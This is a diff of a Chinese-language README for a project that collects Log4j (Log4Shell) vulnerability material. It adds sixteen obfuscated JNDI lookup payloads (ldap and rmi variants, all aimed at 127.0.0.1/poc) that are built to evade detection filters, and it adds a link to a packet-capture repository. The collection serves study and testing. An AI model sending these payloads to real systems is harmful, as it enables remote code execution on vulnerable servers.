@@ -1,6 +1,6 @@
 # HackLog4j-永恒之恶龙
 
-本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2022年1月1日。
+本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2022年1月4日。
 
 - [00-Log4j永恒恶龙](https://github.com/0e0w/HackLog4j#00-log4j%E6%B0%B8%E6%81%92%E6%81%B6%E9%BE%99)
 - [01-Log4j基础知识](https://github.com/0e0w/HackLog4j#01-log4j%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)
@@ -128,6 +128,22 @@ ${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1}
 ${jnd${upper:i}:ldap://127.0.0.1/poc}
 ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://127.0.0.1/poc}
 ${jndi:ldap://127.0.0.1#127.0.0.1:1389/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
+${${lower:jndi}:${lower:ldap}://127.0.0.1/poc}
+${${::-j}ndi:rmi://127.0.0.1/poc}
+${${lower:${lower:jndi}}:${lower:ldap}://127.0.0.1/poc}
+${${lower:jndi}:${lower:rmi}://127.0.0.1/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://127.0.0.1/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p://127.0.0.1/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://127.0.0.1/poc}
+${j${env:DOESNOTEXIST:-}ndi:ldap://127.0.0.1/poc}
+${j${env:DOESNOTEXIST:-}ndi:rmi://127.0.0.1/poc}
+${${: : : : ::: :: :: : :::-j}ndi:ldap://127.0.0.1/poc}
+${${: : : : ::: :: :: : :::-j}ndi:rmi://127.0.0.1/poc}
+${${::::::::::::::-j}ndi:ldap://127.0.0.1/poc}
+${${::::::::::::::-j}ndi:rmi://127.0.0.1/poc}
 ```
 
 - https://github.com/test502git/log4j-fuzz-head-poc
@@ -268,6 +284,7 @@ ${jndi:ldap://127.0.0.1#127.0.0.1:1389/poc}
 - https://github.com/dbgee/CVE-2021-44228
 - https://github.com/lcosmos/apache-log4j-poc
 - https://github.com/aalex954/Log4PowerShell
+- https://github.com/fox-it/log4shell-pcaps
 
 ## 06-Log4j漏洞修复
 
